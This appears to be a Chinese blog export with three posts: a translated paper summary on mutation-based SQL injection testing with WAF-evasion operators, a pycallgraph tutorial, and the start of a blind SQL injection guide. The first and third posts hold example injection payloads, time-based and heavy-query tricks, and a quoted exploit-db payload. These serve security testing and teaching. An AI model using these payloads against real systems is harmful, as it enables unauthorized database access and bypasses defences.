title="运算符：MO_par"></a><strong>运算符：MO_par</strong></h5><p>在输入的末尾附加右括号。</p><p><strong>示例：</strong></p><p>原始输入：67，变异输入：67）.当用 MO_or MO_cmt 进一步突变输入时，获得的突变输入将是：67）OR 1 &#x3D; 1 -{}-。让我们考虑一个预定语句：</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE character = CHR(&quot;+input+&quot;)&quot;</code></pre><p>其中函数CHR将整数转换为其对应的Unicode字符。更改的SQL语句：</p><pre><code class="hljs">SELECT * FROM table WHERE character = CHR(67) OR 1 = 1 -）</code></pre><h5 id="运算符：MO-cmt"><a href="#运算符：MO-cmt" class="headerlink" title="运算符：MO_cmt"></a><strong>运算符：MO_cmt</strong></h5><p>向输入添加SQL注释命令（双短划线和＃）。注释命令后面的任何SQL都不会执行。</p><p><strong>示例：</strong></p><p>原始输入：67，在使用MO_or 和 MO_Par 变异后：67) or 1 &#x3D; 1。这会将预定义语句</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE character = CHR(&quot;+input+&quot;)&quot;</code></pre><p>更改为组合语句，这会导致语法错误：</p><pre><code class="hljs">SELECT * FROM table WHERE character = CHR（67）OR 1 = 1 ）</code></pre><p>然后我们应用MO_cmt来获得：67）OR 1 &#x3D; 1＃ 最终的语句：</p><pre><code class="hljs">SELECT * FROM table WHERE character = CHR(67) OR 1 = 1＃)</code></pre><p>应用此突变会导致解析器忽略最后一个括号，从而避免由于括号数不均衡而导致的解析器错误。</p><h5 id="运算符：MO-qot"><a href="#运算符：MO-qot" class="headerlink" title="运算符：MO_qot"></a><strong>运算符：MO_qot</strong></h5><p>向突变体添加单引号（’）或双引号（“）。</p><p><strong>示例：</strong></p><p>原始输入：Smith，用MO突变或：Smith OR 1 &#x3D; 1。这会将预定语句：</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE name =&#39;&quot;+input+&quot;&#39;&quot;</code></pre><p>更改为组合语句，这不会导致所需的行为更改，因为将突变体视为字符串文字：</p><pre><code class="hljs">SELECT * FROM table WHERE name =&#39;Smith OR 1 = 1&#39;）</code></pre><p>在使用MO_qot和 MO_cmt进一步变异后：Smith’ OR 1 &#x3D; 1＃，最终的语句是</p><pre><code class="hljs">SELECT * FROM table WHERE name =&#39;Smith&#39; OR 1 = 1＃）</code></pre><p>这在语法上是正确的并且改变了逻辑原始声明。</p><h4 id="混淆运算符"><a href="#混淆运算符" class="headerlink" title="混淆运算符"></a><strong>混淆运算符</strong></h4><ul><li>更改空格的编码</li><li>更改用引号括起来的字符文字的编码</li><li>将输入的编码更改为HTML实体编码</li><li>将输入的编码更改为百分比编码</li><li>重写布尔表达式，同时保留它的真值</li><li>通过随机化大写和插入注释来混淆SQL关键字</li></ul><p>一些应用程序使用输入过滤器（例如，web应用程序防火墙）来防御SQLi攻击。本质上，WAF检查每个输入以检查SQLi攻击中通常使用的可疑字符串模式，例如SQL关键字，并阻止它们。例如，WAF使用黑名单来定义禁止的字符或字符串，以确定输入是否可疑。在实践中，许多安全关键系统受到这些过滤器的保护。例如，处理信用卡数据的软件系统必须使用WAF来防止攻击并符合行业安全标准。混淆变异操作符试图通过将输入变为语义上等效的输入但是以不同的形式来避免过滤。这可能会阻止过滤器识别变异输入中的禁用字符&#x2F;字符串。我们定义了以下混淆变异运算符：</p><h5 id="运算符：MO-wsp"><a href="#运算符：MO-wsp" class="headerlink" title="运算符：MO_wsp"></a><strong>运算符：MO_wsp</strong></h5><p>用语义等效字符（+，&#x2F;**&#x2F; 或unicode编码：％20，％09，％0a，％0b，％0c，％0d和％a0）替换空格。</p><p><strong>示例：</strong></p><p>原始输入：1 OR 1 &#x3D; 1，突变输入：1 + OR + 1 &#x3D; 1。这会更改预定义语句：</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE id =&quot;+ input</code></pre><p>为：</p><pre><code class="hljs">SELECT * FROM table WHERE id = 1 + OR + 1 = 1</code></pre><h5 id="运算符：MO-chr"><a href="#运算符：MO-chr" class="headerlink" title="运算符：MO_chr"></a><strong>运算符：MO_chr</strong></h5><p>用等效表示替换用引号（’c’）括起来的字符文字，其中c是任意可打印的ASCII字符。等效表示是：</p><ul><li>短二进制表示，例如，’a’被替换为b’1100001’。</li><li>长二进制表示，例如，’a’被替换为二进制’1100001’。</li><li>Unicode表示，例如，’a’被替换为n’a’。</li><li>十六进制表示，例如，’a’被替换为x’61’。</li></ul><p><strong>示例：</strong></p><p>原始输入：1，用 MO_or：1 OR’a’&#x3D;’a’，进一步用 MO_chr突变：1 or ‘a’&#x3D; x’61’。这改变了预定语句：</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE id =&quot;+ input </code></pre><p>为：</p><pre><code class="hljs">SELECT * FROM table WHERE id = 1 OR&#39;a&#39;= x&#39;61&#39;。</code></pre><h5 id="运算符：MO-html"><a href="#运算符：MO-html" class="headerlink" title="运算符：MO_html"></a><strong>运算符：MO_html</strong></h5><p>使用HTML实体编码更改突变体的编码。在HTML实体编码中，字符可以用两种方式编码：</p><p>(a)形式为＆#N的数字字符引用，其中N是十进制或十六进制表示中使用的字符集中字符的代码位置; (b)形式为＆SymbolicName的字符实体引用。例如，“是单引号字符（’）的编码。</p><p><strong>示例：</strong></p><p>原始输入：1，用 MO_or ：1 OR’a’&#x3D;’a’，进一步用 MO_html 突变：1 or “a”: &#x3D; “a” 这将转换预定语句：</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE id =&quot; + input </code></pre><p>为：</p><pre><code class="hljs">SELECT * FROM table WHERE id = 1 OR &amp;quot;a&amp;quot; = &amp;quot;a&amp;quot;。</code></pre><h5 id="运算符：MO-per"><a href="#运算符：MO-per" class="headerlink" title="运算符：MO_per"></a><strong>运算符：MO_per</strong></h5><p>使用百分比编码更改突变体的编码：％HH，其中HH是指向字符ASCII码的两位十六进制值。例如，单引号字符（’）编码为％27。</p><p><strong>示例：</strong></p><p>原始输入：1，用 MO_or：1 OR’a’&#x3D;’a’，进一步用MO_Per进行突变：1 OR％20’a’&#x3D;’a’。<br>这将转换预定语句：</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE id =&quot;+ input </code></pre><p>为：</p><pre><code class="hljs">SELECT table WHERE id = 1 OR％20&#39;a&#39;=&#39;a&#39;</code></pre><h5 id="运算符：MO-bool"><a href="#运算符：MO-bool" class="headerlink" title="运算符：MO_bool"></a><strong>运算符：MO_bool</strong></h5><p>用等效的布尔表达式替换布尔表达式。例如，布尔表达式1 &#x3D; 1在MO中使用或者可以被混淆为not false &#x3D; !!1。两个表达式都评估为true，在混淆之后保持突变体的相同语义。</p><p><strong>示例：</strong></p><p>原始输入：1，用MO_or：1 OR 1 &#x3D; 1，进一步用 MO_bool突变：1 OR not false &#x3D; !! 1<br>这将预定义语句 </p><pre><code class="hljs">&quot;SELECT * FROM table WHERE id =&quot;+ input </code></pre><p>为：</p><pre><code class="hljs">SELECT * FROM table WHERE id = 1 OR not false = !! 1</code></pre><h5 id="运算符：MO-keyw"><a href="#运算符：MO-keyw" class="headerlink" title="运算符：MO keyw"></a><strong>运算符：MO keyw</strong></h5><p>使用不同的技术对SQL关键字和运算符进行混淆：随机更改某些字母的大小写，在关键字中间添加注释或使用替代表示替换关键字。大多数SQL解析器都不区分大小写，例如关键字 select，SELECT或SeLeCt都是有效的。一些解析器接受在关键字中间包含注释的关键字（例如sel &#x2F;<em>comment here</em>&#x2F; ect.）。最后，一些关键字具有替代形式，例如OR也可以表示为 ||。</p><p><strong>示例：</strong></p><p>原始输入：1，用MO_or：1 OR 1 &#x3D; 1，MO键的进一步突变：1 || 1 &#x3D; 1。这会更改预定义语句：</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE id =&quot;+input </code></pre><p>为：</p><pre><code class="hljs">SELECT * FROM table WHERE id = 1 || 1 = 1。</code></pre><h3 id="测试生成"><a href="#测试生成" class="headerlink" title="测试生成"></a><strong>测试生成</strong></h3><p>可以将单个或多个不同类型的变异算子应用于单个输入参数以生成所需输入。后一种情况旨在检测细微的漏洞，这些漏洞只能通过组合多个变异算子生成的输入来触发。例如，考虑一个通过搜索可以使用其中一个行为改变运算符生成的已知攻击模式来输入输入的应用程序。要形成成功的攻击，必须首先应用行为改变运算符，然后应用一个或多个混淆运算符。</p><p>每个突变链都必须从一个有效的测试用例开始，这样可以满足被测应用程序的输入验证。从有效的测试用例开始，可以确保避免生成由于输入或不太可能随机生成的复杂输入结构之间的依赖性而被应用程序直接拒绝的测试用例。</p><p>此外，有效的测试用例具有更有可能满足输入验证并到达应用程序的关键部分（例如SQL查询）的好处。例如，如果某个应用程序需要信用卡号码以及我们希望改变的其他输入，则信用卡号码必须遵循一种良好的格式;否则测试用例会立即被拒绝。使用所提出的方法，可以重用现有功能测试套件中的有效测试用例，或者，如果不存在此类测试套件，则可以使用SoapUI4和类似工具手动创建有效的测试用例。</p><p>算法1正式定义了测试生成算法：从有效的测试用例开始，每个输入都被预定的次数变异。apply_MO（第4行）函数随机将一个或多个变异运算符应用于当前输入。该函数使用一种简单的语法，该语法定义了组合运算符的不同合法方法，并确保应用运算符的所有前提条件都得到满足。然后使用更新的测试用例TC0调用被测操作。如果是oracle存在漏洞，则会检查因调用而发出的所有SQL语句。如果可执行SQL语句的百分比（即，不包含语法错误的语句）高于预定阈值P，则将输入报告为易受攻击并保存测试用例以帮助测试工程师进行调试并解决漏洞（第5-8行在我们的实验中，我们选择P &#x3D; 100％，这意味着所有触发的SQL语句都必须是可执行的。</p><p><strong>算法1测试生成算法：</strong></p><p><strong>输入</strong></p><p>TC：测试用例：ArrayOf(input)<br>OP：要测试的Web服务操作输出<br>TS：针对SQLi漏洞的测试套件<br>V：易受攻击的输入集</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%BE%93%E5%85%A5%E5%8F%98%E5%BC%82%E6%96%B9%E6%B3%952.png" alt="此处输入图片的描述"></p><p>下图显示了由我们的方法生成的SOAP消息(测试用例)的示例。这里参数minPrice，maxPrice和start的输入值与原始测试用例保持一致，而参数country的输入值已经变异以包含SQLi攻击。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%BE%93%E5%85%A5%E5%8F%98%E5%BC%82%E6%96%B9%E6%B3%953.png" alt="此处输入图片的描述"></p><h3 id="测试oracle"><a href="#测试oracle" class="headerlink" title="测试oracle"></a><strong>测试oracle</strong></h3><p>当恶意输入发送到目标系统时，如果成功，可能会导致系统出现异常。在大多数情况下，异常行为的表现可能是从目标系统返回的结果（例如，显示非预期内容的网页）或周围环境（例如，崩溃，对操作系统的非法调用或对数据的非预期访问）提供服务。在我们的实验中，因为我们专注于SQL注入，所以我们部署了一个数据库代理，它拦截目标系统与其数据库之间的通信，以识别输入是否有潜在危害。例如，我们可以将 GreenSQL 用于此目的。之前的一项将<a href="https://github.com/larskanis/greensql-fw">GreenSQL</a>与类似工具进行比较的研究发现，它在检测SQL注入攻击方面是最有效的。</p><p>在我们之前的工作中已经讨论了使用数据库代理作为oracle的细节。通常，使用正常的数据库访问来部署和训练数据库代理。这些训练数据是系统的常规使用或现有功能测试套件的执行的结果。基于训练数据，代理学习合法SQL语句的规则模式。一旦经过培训，代理将继续观察系统与其数据库之间的流量，并在识别可疑数据库查询时发出警报。</p><p>每个警报对应一个数据库SQL语句，一个测试用例可能导致多个SQL语句，从而导致多个警报。为避免因训练不完整而导致误报，可能需要手动检查以验证所有已标记的 SQL语句实际上指向了系统中的漏洞。</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a><strong>工具</strong></h3><p>提出的变异方法已经实现为Java工具，称为Xavier6。它可用于测试基于SOAP的Web服务的SQLi漏洞。下图显示了该工具的关键组件（测试生成器和监视器）以及它在实践中的使用方式。测试生成器将要测试的Web服务的WSDL文件作为输入，并为每个必须测试的Web服务操作提供示例测试用例。</p><p>这样的样本测试用例可以通过专业工具（如SoapUI）或现有方法轻松生成。然后，该工具检查示例测试用例以查找操作的所有输入参数，并使用我们的突变方法生成的SQLi攻击替换每个参数，一次一个。修改过的测试用例将被发送到被测试的Web服务（图中的SUT）。在某些设置中，可能会在测试生成器和SUT之间部署Web应用程序防火墙（WAF组件）。 oracle组件（gure中的DB代理组件）观察SUT与其数据库之间的交互以检测恶意SQL语句。</p><p>最后，Xavier的Monitor组件不断查询 oracle 组件，以了解生成的输入是否显示SQLi漏洞。在Xavier中，我们集成了GreenSQL来拦截SQL语句。数据库代理使用学习方法来检测SQLi漏洞。因此，必须在学习阶段对其进行培训，以识别合法的SQL语句。在检测阶段，代理将所有先前未学习的截获语句视为SQLi攻击</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%BE%93%E5%85%A5%E5%8F%98%E5%BC%82%E6%96%B9%E6%B3%954.png" alt="此处输入图片的描述"></p><p>如果它形成语法正确的SQL，则会进一步分析每个可疑的恶意语句。攻击者只能利用SQLi漏洞，如果他能够以产生的SQL语句没有语法错误的方式注入恶意输入。否则，攻击者无法达到他的目标，例如，获取&#x2F;修改数据或改变应用程序的控制</p><p>如果没有执行恶意声明。 MySQL-Proxy7工具用于监视SQL语句是否已执行或执行期间是否存在错误。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a><strong>结论</strong></h2><p>我们在本文中介绍了一种针对SQL注入漏洞的自动变异技术，该工具由一个工具支持，该工具专注于改变Web服务参数的输入值。该技术利用一组变异算子，能够</p><p>(1)生成具有修改服务行为的高可能性的输入，<br>(2)纠正输入以消除由于突变导致的可能的语法错误<br>(3)混淆攻击以增加他们通过防火墙进行攻击的机会。</p><p>我们技术的最终目标是生成随机输入，以通过可执行的SQL语句检测SQL漏洞，通过防火墙，并过度暴露或破坏数据库中的数据。我们的实验结果表明，我们的技术和工具比实践状态标准攻击模式表现更好，并且检测SQL注入漏洞的概率很高，即使存在防火墙，并且具有合理数量的测试每个服务中每个输入参数的大小写执行。</p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a><strong>个人总结</strong></h2><p>本文主要简答的介绍了 SQLi fuzz 中使用的 输入数据变异方法，首先基于正确的输入，然后利用工具提供等效的输入来绕过一些 waf ，相当于是我们平时手工测试的自动化实现</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><strong>原文链接</strong></h2><p><a href="http://people.svv.lu/nguyen/issta14.pdf">Automated Testing for SQL Injection Vulnerabilities: An Input Mutation Approach</a></p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图形化显示 Python 函数之间的调用关系</title>
    <link href="/2019/02/22/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%98%BE%E7%A4%BA%20Python%20%E5%87%BD%E6%95%B0%E4%B9%8B%E9%97%B4%E7%9A%84%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB/"/>
    <url>/2019/02/22/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%98%BE%E7%A4%BA%20Python%20%E5%87%BD%E6%95%B0%E4%B9%8B%E9%97%B4%E7%9A%84%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>由于最近在分析 Python 写成的项目的代码，但是由于项目庞大、设计函数繁多、调用关系复杂，往往单纯地依靠肉眼和注释等方式去记录或者是使用 Pycharm 等编译工具去动态的调试在我看来都不能满足我对整个项目运行过程清楚理解的需要，因此就需要一款工具能比较方便的记录程序运行过程中的函数调用关系，最好还能使用图形化的形式表示出来，就非常类似于 IDA 的函数流程框图的功能，我找了一下还真有这样的好用的东西，于是这里简单的记录一下，方便后面的使用。</p><h2 id="0X01-安装方法"><a href="#0X01-安装方法" class="headerlink" title="0X01 安装方法"></a><strong>0X01 安装方法</strong></h2><h3 id="1-下载并安装graphviz"><a href="#1-下载并安装graphviz" class="headerlink" title="1.下载并安装graphviz"></a><strong>1.下载并安装graphviz</strong></h3><p>**下载地址：**<a href="https://graphviz.gitlab.io/_pages/Download/windows/graphviz-2.38.msi">https://graphviz.gitlab.io/_pages/Download/windows/graphviz-2.38.msi</a></p><blockquote><p>**注意：**安装路径可任意选择</p></blockquote><h3 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2.配置环境变量"></a><strong>2.配置环境变量</strong></h3><p>比如我的安装路径是</p><pre><code class="hljs">E:\Graphviz2.38</code></pre><p>那么就在系统环境变量 path 中添加下面的项</p><pre><code class="hljs">E:\Graphviz2.38\bin</code></pre><h3 id="3-安装-pycallgraph"><a href="#3-安装-pycallgraph" class="headerlink" title="3.安装 pycallgraph"></a><strong>3.安装 pycallgraph</strong></h3><pre><code class="hljs">pip install pycallgraph</code></pre><span id="more"></span><h2 id="0X02-使用方法"><a href="#0X02-使用方法" class="headerlink" title="0X02 使用方法"></a><strong>0X02 使用方法</strong></h2><h3 id="1-在项目主函数所在文件中引入依赖包"><a href="#1-在项目主函数所在文件中引入依赖包" class="headerlink" title="1.在项目主函数所在文件中引入依赖包"></a><strong>1.在项目主函数所在文件中引入依赖包</strong></h3><p>比如如果我分析的是 sqlmap ，那么我们可以在 sqlmap.py 中添加下面的依赖</p><pre><code class="hljs">from pycallgraph import PyCallGraphfrom pycallgraph.output import GraphvizOutputfrom pycallgraph import Configfrom pycallgraph import GlobbingFilter</code></pre><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9B%BE%E5%BD%A2%E5%8C%96Python1.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong></p><p>这里有一个点就是有些项目可能会规定某些 import<br>必须在第一行，那么如果这时候你把这个引用放在最上面可能项目不能正常运行，这要根据不同的项目而定</p></blockquote><h3 id="2-设定要显示或者不要显示的函数"><a href="#2-设定要显示或者不要显示的函数" class="headerlink" title="2.设定要显示或者不要显示的函数"></a><strong>2.设定要显示或者不要显示的函数</strong></h3><p>我们在 <code>if __name__ == &quot;__main__&quot;:</code> 下，main() 之上可设置我们想要在图中显示的函数和想要隐藏的函数(这个设置不是必须的，在我的使用中就没有特殊的需要，我便没有设置)</p><pre><code class="hljs">def main():# 你的主函数代码。        if __name__ == &quot;__main__&quot;:    # 下面是添加部分    config = Config()    # 关系图中包括(include)哪些函数名。    #如果是某一类的函数，例如类gobang，则可以直接写&#39;gobang.*&#39;，表示以gobang.开头的所有函数。（利用正则表达式）。    config.trace_filter = GlobbingFilter(include=[        &#39;main&#39;,        &#39;draw_chessboard&#39;,        &#39;draw_chessman&#39;,        &#39;draw_chessboard_with_chessman&#39;,        &#39;choose_save&#39;,        &#39;choose_turn&#39;,        &#39;choose_mode&#39;,        &#39;choose_button&#39;,        &#39;save_chess&#39;,        &#39;load_chess&#39;,        &#39;play_chess&#39;,        &#39;pop_window&#39;,        &#39;tip&#39;,        &#39;get_score&#39;,        &#39;max_score&#39;,        &#39;win&#39;,        &#39;key_control&#39;    ])    # 该段作用是关系图中不包括(exclude)哪些函数。(正则表达式规则)    # config.trace_filter = GlobbingFilter(exclude=[    #     &#39;pycallgraph.*&#39;,    #     &#39;*.secret_function&#39;,    #     &#39;FileFinder.*&#39;,    #     &#39;ModuleLockManager.*&#39;,    #     &#39;SourceFilLoader.*&#39;    # ])    ...</code></pre><h3 id="3-main-前调用我们的绘图函数"><a href="#3-main-前调用我们的绘图函数" class="headerlink" title="3.main()前调用我们的绘图函数"></a><strong>3.main()前调用我们的绘图函数</strong></h3><pre><code class="hljs">...graphviz = GraphvizOutput()graphviz.output_file = &#39;graph.png&#39;with PyCallGraph(output=graphviz, config=config):    main()</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9B%BE%E5%BD%A2%E5%8C%96Python2.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong></p><p>因为我这里没有特别的配置于是 PyCallGraph() 函数里没有上面代码中的 config 选项</p></blockquote><h2 id="0X03-运行结果"><a href="#0X03-运行结果" class="headerlink" title="0X03 运行结果"></a><strong>0X03 运行结果</strong></h2><h3 id="1-运行我的-sqlmap-py"><a href="#1-运行我的-sqlmap-py" class="headerlink" title="1.运行我的 sqlmap.py"></a><strong>1.运行我的 sqlmap.py</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9B%BE%E5%BD%A2%E5%8C%96Python3.png" alt="此处输入图片的描述"></p><h3 id="2-在当前目录下生成指定图片"><a href="#2-在当前目录下生成指定图片" class="headerlink" title="2.在当前目录下生成指定图片"></a><strong>2.在当前目录下生成指定图片</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9B%BE%E5%BD%A2%E5%8C%96Python4.png" alt="此处输入图片的描述"></p><h3 id="3-图片效果"><a href="#3-图片效果" class="headerlink" title="3.图片效果"></a><strong>3.图片效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9B%BE%E5%BD%A2%E5%8C%96Python5.png" alt="此处输入图片的描述"></p><h2 id="0X04-总结"><a href="#0X04-总结" class="headerlink" title="0X04 总结"></a><strong>0X04 总结</strong></h2><p>现在可以愉快地开始我们的分析之旅了！</p><h2 id="0X05-参考"><a href="#0X05-参考" class="headerlink" title="0X05 参考"></a><strong>0X05 参考</strong></h2><p><a href="https://blog.csdn.net/qq_36408085/article/details/82952846">https://blog.csdn.net/qq_36408085/article/details/82952846</a><br><a href="https://blog.csdn.net/Marksinoberg/article/details/52809192">https://blog.csdn.net/Marksinoberg/article/details/52809192</a></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一篇文章带你深入理解 SQL 盲注</title>
    <link href="/2019/02/21/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20SQL%20%E7%9B%B2%E6%B3%A8/"/>
    <url>/2019/02/21/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20SQL%20%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<p>原文首发于安全客：<a href="https://www.anquanke.com/post/id/170626">https://www.anquanke.com/post/id/170626</a></p><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>简单的整理一下关于 SQL 盲注的一些想法(主要是针对 MYSQL,当然其中也不免夹杂着一些 SQL Server 和Oracle的知识)，希望能有更清晰的思路和不一样的思考。</p><h2 id="0X01-盲注的一般模式"><a href="#0X01-盲注的一般模式" class="headerlink" title="0X01 盲注的一般模式"></a><strong>0X01 盲注的一般模式</strong></h2><p>盲注的本质是猜解(所谓 “盲” 就是在你看不到返回数据的情况下能通过 “感觉” 来判断)，那能感觉到什么？答案是**：差异**（包括<strong>运行时间的差异</strong>和<strong>页面返回结果的差异</strong>）。也就是说我们想实现的是我们要构造一条语句来测试我们输入的<strong>布尔表达式</strong>，使得布尔表达式结果的真假直接影响整条语句的执行结果，从而使得系统有不同的反应，在时间盲注中是不同的返回的时间，在布尔盲注中则是不同的页面反应。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A818.png" alt="此处输入图片的描述"></p><span id="more"></span><p><strong>我们可以把我们输入布尔表达式的点，称之为整条语句的开关，起到整条语句结果的分流作用，而此时 我们就可以把这种能根据其中输入真假返回不同结果的函数叫做开关函数，或者叫做分流函数</strong></p><p>说到这里其实首先想到的应该就是使用 if 这种明显的条件语句来分流，但是有时候 if 也不一定能用，那不能用我们还是想分流怎么办，实际上方法很多，我们还能利用 and 或者 or  的这种短路特性实现这种需求，示例如下：</p><h3 id="1-and-0-的短路特性"><a href="#1-and-0-的短路特性" class="headerlink" title="1.and 0 的短路特性"></a><strong>1.and 0 的短路特性</strong></h3><pre><code class="hljs">mysql&gt; select * from bsqli where id = 1 and 1 and sleep(1);Empty set (1.00 sec)mysql&gt; select * from bsqli where id = 1 and 0 and sleep(1);Empty set (0.00 sec)</code></pre><p>这个怎么看，实际上 一个 and 连接的是两个集合，and 表示取集合的交集，我么知道0 和任何集合的交集都是 0 ，那么系统就不会继续向下执行 sleep()，那么为什么第一条语句没有返回任何东西呢？因为 id &#x3D;1 的结果和 sleep(1) 的交集为空集</p><h3 id="2-or-1-的短路特性"><a href="#2-or-1-的短路特性" class="headerlink" title="2.or 1 的短路特性"></a><strong>2.or 1 的短路特性</strong></h3><pre><code class="hljs">mysql&gt; select * from bsqli where id = 1 or 1 or sleep(1);+----+--------+----------+| id | name   | password |+----+--------+----------+|  1 | K0rz3n | 123456   ||  2 | L_Team | 234567   |+----+--------+----------+2 rows in set (0.00 sec)mysql&gt; select * from bsqli where id = 1 or 0 or sleep(1);+----+--------+----------+| id | name   | password |+----+--------+----------+|  1 | K0rz3n | 123456   |+----+--------+----------+1 row in set (1.00 sec)</code></pre><p>和上面类似 or 取得是两个集合的并集，系统检测到 or 1 的时候就不会继续检测，所以 sleep() 也就不会运行。</p><p>那么这里我们可以将 sleep() 换成我们下面准备讲的 Heavy Query ，如下</p><pre><code class="hljs">id = 1&#39; and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23id = 1&#39; and 0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23</code></pre><p>除了上面两个我们还能用 <strong>case when then else end</strong> 这个句型，这个和 <strong>if</strong> 是类似的我这里就不多介绍，我这里还想说一个我另外发现的比较有趣的一个函数(<strong>准确的说是两个函数</strong>)</p><h3 id="3-elt-的分流特性"><a href="#3-elt-的分流特性" class="headerlink" title="3.elt() 的分流特性"></a><strong>3.elt() 的分流特性</strong></h3><pre><code class="hljs">ELT(N ,str1 ,str2 ,str3 ,…)</code></pre><p>函数使用说明：若 N &#x3D; 1 ，则返回值为 str1 ，若 N &#x3D; 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL 。 ELT() 是 FIELD() 的补数</p><pre><code class="hljs">mysql&gt; select * from bsqli where id = 1 and elt((1&gt;1)+1,1=1,sleep(1));+----+--------+----------+| id | name   | password |+----+--------+----------+|  1 | K0rz3n | 123456   |+----+--------+----------+1 row in set (0.00 sec)mysql&gt; select * from bsqli where id = 1 and elt((1=1)+1,1=1,sleep(1));Empty set (1.00 sec)</code></pre><p>后来我发现这个确实是有<a href="https://www.exploit-db.com/exploits/42033">案例</a>的，但是和我这个用法没哈关系，可能只是我见识比较短浅，这是当时的payload：</p><pre><code class="hljs">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</code></pre><h3 id="4-field-的分流特性"><a href="#4-field-的分流特性" class="headerlink" title="4.field() 的分流特性"></a><strong>4.field() 的分流特性</strong></h3><pre><code class="hljs">FIELD(str, str1, str2, str3, ……)</code></pre><p>该函数返回的是 str 在面这些字符串的位置的索引，如果找不到返回 0 ，但我发现这个函数同样可以作为开关来使用，如下：</p><pre><code class="hljs">mysql&gt; select * from bsqli where id = 1 and field(1&gt;1,sleep(1));+----+--------+----------+| id | name   | password |+----+--------+----------+|  1 | K0rz3n | 123456   |+----+--------+----------+1 row in set (2.00 sec)mysql&gt; select * from bsqli where id = 1 and field(1=1,sleep(1));Empty set (1.00 sec)</code></pre><blockquote><p>但是这其实给了我们一种新的思路：有时候时间延迟的长短可以作为我们判断的依据，并不一定是有延迟和没延迟(当然这只是我原来没注意，不代表看这篇文章的师傅们不知道<br>orz)</p></blockquote><p>另外就是如果有些函数返回的是 NULL 并不代表这个函数不能作为开关函数或者分流函数使用，因为我们还有一个函数叫做 isnull() ，可以将 null 转化成真或者假。</p><p>当然方法肯定不止这两个，这里仅仅是讲解原理的简单举例。</p><h2 id="0X02-基于时间的盲注"><a href="#0X02-基于时间的盲注" class="headerlink" title="0X02 基于时间的盲注"></a><strong>0X02 基于时间的盲注</strong></h2><p>基于时间的盲注的一般思路是延迟注入，说白了就是将判断条件结合延迟函数注入进入，然后根据语句执行时间的长短来确定判断语句返回的 TRUE 还是 FALSE，从而去猜解一些未知的字段(整个猜解过程其实就是一种 fuzz)。</p><h3 id="1-MYSQL-的-sleep-和-benchmark"><a href="#1-MYSQL-的-sleep-和-benchmark" class="headerlink" title="1. MYSQL 的 sleep 和 benchmark"></a><strong>1. MYSQL 的 sleep 和 benchmark</strong></h3><p><strong>我们常用的方法就是 sleep() 和 benchmark(),如下图所示</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A811_.png" alt="此处输入图片的描述"></p><p>上面两个语句适用来判断是否存在 sql 注入的(<strong>注意 sleep 是存在一个满足条件的行就会延迟指定的时间，比如sleep(5)，但是实际上查找到两个满足条件的行，那么就会延迟10s,这其实是一个非常重要的信息，在真实的渗透测试过程中，我们有时候不清楚整个表的情况的话，可以用这样的方式进行刺探，比如设置成 sleep(0.001) 看最后多少秒有结果，推断表的行数</strong>)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A812.png" 